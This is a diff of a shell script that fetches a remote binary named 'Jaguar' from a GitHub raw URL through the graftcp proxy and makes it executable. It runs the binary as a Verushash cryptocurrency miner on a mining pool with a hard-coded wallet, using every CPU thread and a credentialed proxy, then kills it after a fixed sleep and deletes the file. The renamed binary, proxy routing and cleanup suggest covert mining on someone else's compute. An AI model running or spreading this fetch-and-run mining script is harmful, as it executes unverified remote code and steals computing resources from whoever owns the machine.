@@ -38,11 +38,14 @@ END
   echo " "
   echo " "
 
-  ./root/graftcp/graftcp wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/Jaguar
+  # Use /usr/bin/graftcp to download Jaguar
+  /usr/bin/graftcp wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/Jaguar
+
+  # Make sure Jaguar is executable
   chmod +x Jaguar
   
   # Run ccminer in the background
-  ./root/graftcp/graftcp ./Jaguar ---algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.NORTAMERICA --cpu-threads "$(nproc)" --proxy $username:$password@$proxy  &
+  /usr/bin/graftcp ./Jaguar ---algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.NORTAMERICA --cpu-threads "$(nproc)" --proxy $username:$password@$proxy  &
 
   # Store the process ID (PID) of ccminer
   ccminer_pid=$!
@@ -50,6 +53,7 @@ END
   # Sleep for xx minutes
   sleep 7000
 
+  # Clean up Jaguar
   rm Jaguar
 
   # Send SIGINT to ccminer to terminate gracefully (equivalent to Ctrl + C)
